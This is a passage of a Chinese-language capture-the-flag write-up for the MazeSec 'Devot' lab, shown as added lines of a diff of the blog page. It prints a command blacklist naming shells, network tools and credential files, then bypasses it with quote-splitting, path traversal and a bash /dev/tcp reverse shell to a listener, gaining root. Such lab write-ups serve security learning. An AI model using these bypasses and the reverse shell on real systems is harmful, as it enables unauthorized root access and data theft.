+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Devot:~$ ls -la /opt/devot/
+</span></span><span class="line"><span class="cl">total <span class="m">24</span>
+</span></span><span class="line"><span class="cl">drwxr-x---    <span class="m">6</span> root     devot         <span class="m">4096</span> Oct <span class="m">19</span> 13:02 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">3</span> root     root          <span class="m">4096</span> Oct <span class="m">19</span> 13:02 ..
+</span></span><span class="line"><span class="cl">drwxr-x---    <span class="m">3</span> root     devot         <span class="m">4096</span> Oct <span class="m">19</span> 13:36 lib
+</span></span><span class="line"><span class="cl">drwxr-x---    <span class="m">2</span> root     devot         <span class="m">4096</span> Oct <span class="m">19</span> 13:36 render
+</span></span><span class="line"><span class="cl">drwxr-x---    <span class="m">2</span> root     root          <span class="m">4096</span> Oct <span class="m">19</span> 13:36 runner
+</span></span><span class="line"><span class="cl">drwxr-x---    <span class="m">4</span> root     devot         <span class="m">4096</span> Oct <span class="m">19</span> 13:36 web
+</span></span><span class="line"><span class="cl">Devot:~$ ls -la /opt/devot/lib
+</span></span><span class="line"><span class="cl">total <span class="m">16</span>
+</span></span><span class="line"><span class="cl">drwxr-x---    <span class="m">3</span> root     devot         <span class="m">4096</span> Oct <span class="m">19</span> 13:36 .
+</span></span><span class="line"><span class="cl">drwxr-x---    <span class="m">6</span> root     devot         <span class="m">4096</span> Oct <span class="m">19</span> 13:02 ..
+</span></span><span class="line"><span class="cl">drwxr-xr-x    <span class="m">2</span> root     root          <span class="m">4096</span> Oct <span class="m">19</span> 13:36 __pycache__
+</span></span><span class="line"><span class="cl">-rw-r-----    <span class="m">1</span> root     devot         <span class="m">3184</span> Oct <span class="m">19</span> 13:36 build_policy.py
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Devot:~$ cat /opt/devot/lib/build_policy.py
+</span></span><span class="line"><span class="cl"><span class="c1">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;Shared build policy for the Devot preview runner.
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">The web tier validates jobs before submitting them. The runner enforces the
+</span></span></span><span class="line"><span class="cl"><span class="s2">same policy again because the Unix socket is a trust boundary.
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">This is a blacklist, not a sandbox: it is intentionally a small hurdle for the
+</span></span></span><span class="line"><span class="cl"><span class="s2">challenge, not a security boundary.
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">FORBIDDEN</span> <span class="o">=</span> <span class="o">(</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># file readers, copiers, and archive tools</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;cat&#34;</span>, <span class="s2">&#34;tac&#34;</span>, <span class="s2">&#34;head&#34;</span>, <span class="s2">&#34;tail&#34;</span>, <span class="s2">&#34;less&#34;</span>, <span class="s2">&#34;more&#34;</span>, <span class="s2">&#34;grep&#34;</span>, <span class="s2">&#34;egrep&#34;</span>, <span class="s2">&#34;fgrep&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;sed&#34;</span>, <span class="s2">&#34;awk&#34;</span>, <span class="s2">&#34;cut&#34;</span>, <span class="s2">&#34;tr&#34;</span>, <span class="s2">&#34;sort&#34;</span>, <span class="s2">&#34;uniq&#34;</span>, <span class="s2">&#34;wc&#34;</span>, <span class="s2">&#34;od&#34;</span>, <span class="s2">&#34;xxd&#34;</span>, <span class="s2">&#34;hexdump&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;strings&#34;</span>, <span class="s2">&#34;base64&#34;</span>, <span class="s2">&#34;base32&#34;</span>, <span class="s2">&#34;rev&#34;</span>, <span class="s2">&#34;nl&#34;</span>, <span class="s2">&#34;pr&#34;</span>, <span class="s2">&#34;fold&#34;</span>, <span class="s2">&#34;fmt&#34;</span>, <span class="s2">&#34;expand&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;unexpand&#34;</span>, <span class="s2">&#34;comm&#34;</span>, <span class="s2">&#34;join&#34;</span>, <span class="s2">&#34;paste&#34;</span>, <span class="s2">&#34;split&#34;</span>, <span class="s2">&#34;csplit&#34;</span>, <span class="s2">&#34;diff&#34;</span>, <span class="s2">&#34;cmp&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;patch&#34;</span>, <span class="s2">&#34;tee&#34;</span>, <span class="s2">&#34;cp&#34;</span>, <span class="s2">&#34;mv&#34;</span>, <span class="s2">&#34;ln&#34;</span>, <span class="s2">&#34;install&#34;</span>, <span class="s2">&#34;dd&#34;</span>, <span class="s2">&#34;tar&#34;</span>, <span class="s2">&#34;gzip&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;gunzip&#34;</span>, <span class="s2">&#34;zcat&#34;</span>, <span class="s2">&#34;bzip2&#34;</span>, <span class="s2">&#34;bzcat&#34;</span>, <span class="s2">&#34;xz&#34;</span>, <span class="s2">&#34;xzcat&#34;</span>, <span class="s2">&#34;zstd&#34;</span>, <span class="s2">&#34;unzip&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;uuencode&#34;</span>, <span class="s2">&#34;uudecode&#34;</span>, <span class="s2">&#34;iconv&#34;</span>, <span class="s2">&#34;recode&#34;</span>, <span class="s2">&#34;openssl&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="c1"># interpreters, wrappers, and network tools</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;sh&#34;</span>, <span class="s2">&#34;bash&#34;</span>, <span class="s2">&#34;ash&#34;</span>, <span class="s2">&#34;dash&#34;</span>, <span class="s2">&#34;zsh&#34;</span>, <span class="s2">&#34;python&#34;</span>, <span class="s2">&#34;python3&#34;</span>, <span class="s2">&#34;perl&#34;</span>, <span class="s2">&#34;ruby&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;php&#34;</span>, <span class="s2">&#34;node&#34;</span>, <span class="s2">&#34;lua&#34;</span>, <span class="s2">&#34;tclsh&#34;</span>, <span class="s2">&#34;busybox&#34;</span>, <span class="s2">&#34;env&#34;</span>, <span class="s2">&#34;printenv&#34;</span>, <span class="s2">&#34;xargs&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;script&#34;</span>, <span class="s2">&#34;expect&#34;</span>, <span class="s2">&#34;nohup&#34;</span>, <span class="s2">&#34;setsid&#34;</span>, <span class="s2">&#34;timeout&#34;</span>, <span class="s2">&#34;stdbuf&#34;</span>, <span class="s2">&#34;unbuffer&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;nice&#34;</span>, <span class="s2">&#34;ionice&#34;</span>, <span class="s2">&#34;taskset&#34;</span>, <span class="s2">&#34;chrt&#34;</span>, <span class="s2">&#34;flock&#34;</span>, <span class="s2">&#34;time&#34;</span>, <span class="s2">&#34;watch&#34;</span>, <span class="s2">&#34;screen&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;tmux&#34;</span>, <span class="s2">&#34;eval&#34;</span>, <span class="s2">&#34;exec&#34;</span>, <span class="s2">&#34;command&#34;</span>, <span class="s2">&#34;builtin&#34;</span>, <span class="s2">&#34;source&#34;</span>, <span class="s2">&#34;alias&#34;</span>, <span class="s2">&#34;hash&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;type&#34;</span>, <span class="s2">&#34;set&#34;</span>, <span class="s2">&#34;unset&#34;</span>, <span class="s2">&#34;export&#34;</span>, <span class="s2">&#34;declare&#34;</span>, <span class="s2">&#34;typeset&#34;</span>, <span class="s2">&#34;local&#34;</span>, <span class="s2">&#34;let&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;read&#34;</span>, <span class="s2">&#34;mapfile&#34;</span>, <span class="s2">&#34;readarray&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;curl&#34;</span>, <span class="s2">&#34;wget&#34;</span>, <span class="s2">&#34;nc&#34;</span>, <span class="s2">&#34;ncat&#34;</span>, <span class="s2">&#34;socat&#34;</span>, <span class="s2">&#34;ssh&#34;</span>, <span class="s2">&#34;scp&#34;</span>, <span class="s2">&#34;sftp&#34;</span>, <span class="s2">&#34;telnet&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;ftp&#34;</span>, <span class="s2">&#34;tftp&#34;</span>, <span class="s2">&#34;rsync&#34;</span>, <span class="s2">&#34;ping&#34;</span>, <span class="s2">&#34;arp&#34;</span>, <span class="s2">&#34;dig&#34;</span>, <span class="s2">&#34;host&#34;</span>, <span class="s2">&#34;nslookup&#34;</span>, <span class="s2">&#34;whois&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="c1"># privilege, process, storage, and build tools</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;chmod&#34;</span>, <span class="s2">&#34;chown&#34;</span>, <span class="s2">&#34;chroot&#34;</span>, <span class="s2">&#34;mount&#34;</span>, <span class="s2">&#34;umount&#34;</span>, <span class="s2">&#34;sudo&#34;</span>, <span class="s2">&#34;su&#34;</span>, <span class="s2">&#34;doas&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;pkexec&#34;</span>, <span class="s2">&#34;runuser&#34;</span>, <span class="s2">&#34;newgrp&#34;</span>, <span class="s2">&#34;rm&#34;</span>, <span class="s2">&#34;rmdir&#34;</span>, <span class="s2">&#34;mkfs&#34;</span>, <span class="s2">&#34;fdisk&#34;</span>, <span class="s2">&#34;parted&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;insmod&#34;</span>, <span class="s2">&#34;modprobe&#34;</span>, <span class="s2">&#34;iptables&#34;</span>, <span class="s2">&#34;nft&#34;</span>, <span class="s2">&#34;systemctl&#34;</span>, <span class="s2">&#34;service&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;rc-service&#34;</span>, <span class="s2">&#34;rc-update&#34;</span>, <span class="s2">&#34;crontab&#34;</span>, <span class="s2">&#34;at&#34;</span>, <span class="s2">&#34;batch&#34;</span>, <span class="s2">&#34;ps&#34;</span>, <span class="s2">&#34;pstree&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;pgrep&#34;</span>, <span class="s2">&#34;pkill&#34;</span>, <span class="s2">&#34;kill&#34;</span>, <span class="s2">&#34;killall&#34;</span>, <span class="s2">&#34;top&#34;</span>, <span class="s2">&#34;free&#34;</span>, <span class="s2">&#34;df&#34;</span>, <span class="s2">&#34;du&#34;</span>, <span class="s2">&#34;lsof&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;fuser&#34;</span>, <span class="s2">&#34;ss&#34;</span>, <span class="s2">&#34;netstat&#34;</span>, <span class="s2">&#34;ip&#34;</span>, <span class="s2">&#34;ifconfig&#34;</span>, <span class="s2">&#34;route&#34;</span>, <span class="s2">&#34;uname&#34;</span>, <span class="s2">&#34;whoami&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;hostname&#34;</span>, <span class="s2">&#34;uptime&#34;</span>, <span class="s2">&#34;who&#34;</span>, <span class="s2">&#34;last&#34;</span>, <span class="s2">&#34;users&#34;</span>, <span class="s2">&#34;groups&#34;</span>, <span class="s2">&#34;getent&#34;</span>, <span class="s2">&#34;ldd&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;dmesg&#34;</span>, <span class="s2">&#34;journalctl&#34;</span>, <span class="s2">&#34;sysctl&#34;</span>, <span class="s2">&#34;apk&#34;</span>, <span class="s2">&#34;dpkg&#34;</span>, <span class="s2">&#34;apt&#34;</span>, <span class="s2">&#34;rpm&#34;</span>, <span class="s2">&#34;git&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;make&#34;</span>, <span class="s2">&#34;gcc&#34;</span>, <span class="s2">&#34;cc&#34;</span>, <span class="s2">&#34;clang&#34;</span>, <span class="s2">&#34;ld&#34;</span>, <span class="s2">&#34;objcopy&#34;</span>, <span class="s2">&#34;objdump&#34;</span>, <span class="s2">&#34;readelf&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;nm&#34;</span>, <span class="s2">&#34;gdb&#34;</span>, <span class="s2">&#34;strace&#34;</span>, <span class="s2">&#34;ltrace&#34;</span>, <span class="s2">&#34;perf&#34;</span>, <span class="s2">&#34;tcpdump&#34;</span>, <span class="s2">&#34;tshark&#34;</span>, <span class="s2">&#34;nmap&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;masscan&#34;</span>, <span class="s2">&#34;sqlite3&#34;</span>, <span class="s2">&#34;mysql&#34;</span>, <span class="s2">&#34;psql&#34;</span>, <span class="s2">&#34;mongo&#34;</span>, <span class="s2">&#34;redis-cli&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="c1"># path prefixes</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;/root&#34;</span>, <span class="s2">&#34;/etc&#34;</span>, <span class="s2">&#34;/home&#34;</span>, <span class="s2">&#34;/var&#34;</span>, <span class="s2">&#34;/opt&#34;</span>, <span class="s2">&#34;/usr&#34;</span>, <span class="s2">&#34;/bin&#34;</span>, <span class="s2">&#34;/sbin&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;/tmp&#34;</span>, <span class="s2">&#34;/dev&#34;</span>, <span class="s2">&#34;/run&#34;</span>, <span class="s2">&#34;/proc&#34;</span>, <span class="s2">&#34;/sys&#34;</span>, <span class="s2">&#34;/boot&#34;</span>, <span class="s2">&#34;/srv&#34;</span>, <span class="s2">&#34;/mnt&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;/media&#34;</span>, <span class="s2">&#34;/lib&#34;</span>, <span class="s2">&#34;/lib64&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="c1"># secrets, flags, and common targets</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;root.txt&#34;</span>, <span class="s2">&#34;flag&#34;</span>, <span class="s2">&#34;shadow&#34;</span>, <span class="s2">&#34;passwd&#34;</span>, <span class="s2">&#34;id_rsa&#34;</span>, <span class="s2">&#34;authorized_keys&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;crontab&#34;</span>, <span class="s2">&#34;cron.d&#34;</span>, <span class="s2">&#34;sudoers&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="c1"># shell syntax</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;;&#34;</span>, <span class="s2">&#34;|&#34;</span>, <span class="s2">&#34;&amp;&#34;</span>, <span class="s2">&#34;</span>$<span class="s2">&#34;</span>, <span class="s2">&#34;`&#34;</span>, <span class="s2">&#34;(&#34;</span>, <span class="s2">&#34;)&#34;</span>, <span class="s2">&#34;{&#34;</span>, <span class="s2">&#34;}&#34;</span>, <span class="s2">&#34;[&#34;</span>, <span class="s2">&#34;]&#34;</span>, <span class="s2">&#34;*&#34;</span>, <span class="s2">&#34;?&#34;</span>, <span class="s2">&#34;~&#34;</span>,
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;#&#34;</span>, <span class="s2">&#34;!&#34;</span>, <span class="s2">&#34;&gt;&#34;</span>, <span class="s2">&#34;&lt;&#34;</span>, <span class="s2">&#34;=&#34;</span>, <span class="s2">&#34;\\&#34;</span>, <span class="s2">&#34;\n&#34;</span>, <span class="s2">&#34;\r&#34;</span>, <span class="s2">&#34;\t&#34;</span>,
+</span></span><span class="line"><span class="cl"><span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">def check_step<span class="o">(</span>step<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> not isinstance<span class="o">(</span>step, str<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> False, <span class="s2">&#34;step must be a string&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">text</span> <span class="o">=</span> step.lower<span class="o">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> token in FORBIDDEN:
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> token in text:
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> False, token
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> True, None
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这么多黑名单，吓哭了。</p>
+<p>检测逻辑是 <code>if token in text:</code>，也就是子串匹配。</p>
+<p>但是没有禁用 <code>'</code> 和 <code>&quot;</code>，所以我们可以拼接绕过，比如 <code>/root</code> 通过 <code>&quot;/roo&quot;&quot;t&quot;</code> 拼接而成。</p>
+<p>读文件禁用了 <code>hexdump</code>，但是没有禁用 Busybox 的 <code>hd</code> 命令（相当于 <code>hexdump -C</code>）。</p>
+<p>所以我们可以实现对 <code>root.txt</code> 的读取，只需将命令修改为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">hd &#39;/roo&#39;&#39;t/roo&#39;&#39;t.txt&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Devot:~$ sudo /usr/local/bin/devot-build web
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;ok&#34;</span>: true, <span class="s2">&#34;job&#34;</span>: <span class="s2">&#34;j-4c7d666297c3b485&#34;</span>, <span class="s2">&#34;project&#34;</span>: <span class="s2">&#34;web&#34;</span>, <span class="s2">&#34;kind&#34;</span>: <span class="s2">&#34;build&#34;</span>, <span class="s2">&#34;exit&#34;</span>: 0, <span class="s2">&#34;stdout&#34;</span>: <span class="s2">&#34;00000000  66 6c 61 67 7b 72 6f 6f  74 2d 64 30 62 31 64 39  |flag{root-d0b1d9|\n00000010  38 39 39 30 37 32 38 38  64 61 31 32 64 33 62 39  |89907288da12d3b9|\n00000020  38 38 62 30 35 39 35 63  35 36 7d 0a              |88b0595c56}.|\n0000002c\n&#34;</span>, <span class="s2">&#34;stderr&#34;</span>: <span class="s2">&#34;&#34;</span>, <span class="s2">&#34;duration_ms&#34;</span>: 7, <span class="s2">&#34;notification&#34;</span>: <span class="s2">&#34;&lt;h1&gt;Preview success&lt;/h1&gt;\n&lt;p&gt;Project &lt;strong&gt;web&lt;/strong&gt; on branch &lt;code&gt;main&lt;/code&gt; finished with exit &lt;strong&gt;0&lt;/strong&gt;.&lt;/p&gt;&#34;</span><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可拼接出 <code>flag{root-d0b1d989907288da12d3b988b0595c56}</code>。</p>
+<p>也可以写马得到 root shell。</p>
+<p>在 <code>/var/lib/devot/builds</code> 下写文件 <code>a</code>，内容为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Devot:/var/lib/devot/builds$ cat a
+</span></span><span class="line"><span class="cl">bash -c <span class="s2">&#34;bash -i &gt;&amp; /dev/tcp/192.168.1.8/1235 0&gt;&amp;1
+</span></span></span><span class="line"><span class="cl"><span class="s2">Devot:/var/lib/devot/builds</span>$<span class="s2"> chmod 777 a
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后将 <code>web.json</code> 中的命令改为：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="s1">&#39;../../bui&#39;&#39;l&#39;&#39;ds/a&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>即，<code>../../builds/a</code>，从而执行文件 <code>a</code>。</p>
+<p>然后监听端口并 <code>sudo /usr/local/bin/devot-build web</code> 即可得到 Shell。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>root㉿kali<span class="o">)</span>-<span class="o">[</span>~/MazeSec/Devot<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─# nc -lvnp <span class="m">1235</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">1235</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>192.168.1.8<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.1.7<span class="o">]</span> <span class="m">45006</span>
+</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>2466<span class="o">)</span>: Not a tty
+</span></span><span class="line"><span class="cl">bash: no job control in this shell
+</span></span><span class="line"><span class="cl">Devot:/var/lib/devot/runner/j-1f38918d1a4ab1df# id
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Devot:/var/lib/devot/runner/j-1f38918d1a4ab1df# <span class="nb">pwd</span>
+</span></span><span class="line"><span class="cl"><span class="nb">pwd</span>
+</span></span><span class="line"><span class="cl">/var/lib/devot/runner/j-1f38918d1a4ab1df
+</span></span><span class="line"><span class="cl">Devot:/var/lib/devot/runner/j-1f38918d1a4ab1df# <span class="nb">cd</span> /root<span class="p">;</span>cat root.txt
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> /root<span class="p">;</span>cat root.txt
+</span></span><span class="line"><span class="cl">flag<span class="o">{</span>root-d0b1d989907288da12d3b988b0595c56<span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/mazesec-sshhole/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Mazesec sshhole</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/mazesec-pot/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">MazeSec Pot</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/mazesec-0l023/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">MazeSec 0l023</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2026 Sp1ke
+    </section>
+    
+    <section class="powerby">
+        
+            记录安全学习 <br/>
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.26.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
